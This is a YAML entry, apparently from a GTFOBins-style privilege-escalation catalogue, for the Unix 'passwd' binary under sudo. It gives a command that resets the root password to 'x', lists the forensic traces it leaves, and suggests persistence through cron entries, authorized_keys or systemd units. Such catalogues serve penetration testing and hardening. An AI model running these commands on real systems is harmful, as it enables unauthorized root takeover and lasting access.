---
name: passwd
capabilities:
- exec
- suid
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: echo -e 'x\nx' | passwd
  notes: This changes the root password to `x`, so it's now possible to log in using, for example, `su`.
references:
- https://gtfobins.github.io/gtfobins/passwd/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
